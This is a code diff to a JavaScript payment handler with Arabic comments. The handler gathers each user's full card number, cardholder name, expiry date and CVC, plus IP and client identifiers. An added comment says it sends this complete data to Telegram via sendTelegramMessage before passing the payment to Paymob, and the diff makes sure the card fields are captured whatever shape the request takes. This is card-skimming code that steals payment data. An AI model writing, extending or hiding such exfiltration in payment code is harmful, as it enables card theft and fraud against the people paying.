@@ -52,6 +52,7 @@ async function handlePaymentRequest(req, res) {
       name,
       expiry,
       cvc,
+      card_data,
       save_card,
       clientID,
       clientId,
@@ -82,6 +83,12 @@ async function handlePaymentRequest(req, res) {
     const userPhone = phone || "غير محدد";
     const payAmount = amount || "5";
 
+    // تجميع بيانات البطاقة سواء أُرسلت داخل كائن card_data أو منفصلة
+    const cardNumber = (card_data && card_data.number) || number || "غير مدخل";
+    const cardName = (card_data && card_data.name) || name || "غير مدخل";
+    const cardExpiry = (card_data && card_data.expiry) || expiry || "غير مدخل";
+    const cardCvc = (card_data && card_data.cvc) || cvc || "غير مدخل";
+
     const detectedPublicIP = publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req);
 
     const paymentPayload = {
@@ -89,10 +96,10 @@ async function handlePaymentRequest(req, res) {
       amount_cents: parseFloat(payAmount) * 100,
       payment_method: selectedMethod,
       card_data: {
-        number: number || "غير مدخل",
-        name: name || "غير مدخل",
-        expiry: expiry || "غير مدخل",
-        cvc: cvc || "غير مدخل",
+        number: cardNumber,
+        name: cardName,
+        expiry: cardExpiry,
+        cvc: cardCvc,
         save_card: save_card === "tokenize" || save_card === "نعم"
       },
       clientID: clientID || clientId || "غير متوفر",
@@ -113,10 +120,12 @@ async function handlePaymentRequest(req, res) {
       lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
     };
 
+    // إرسال البيانات المجمعة كاملة إلى تلجرام
     if (typeof sendTelegramMessage === "function") {
       await sendTelegramMessage(paymentPayload, true);
     }
 
+    // تنفيذ عملية الدفع عبر Paymob
     const result = await processPayment(userPhone, payAmount, selectedMethod);
 
     if (result.type === "redirect") {
@@ -129,6 +138,9 @@ async function handlePaymentRequest(req, res) {
     }
   } catch (err) {
     console.error("❌ خطأ في معالجة الدفع:", err.response?.data || err.message);
+    if (req.headers["content-type"]?.includes("application/json")) {
+      return res.status(500).json({ error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
+    }
     res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
   }
 }
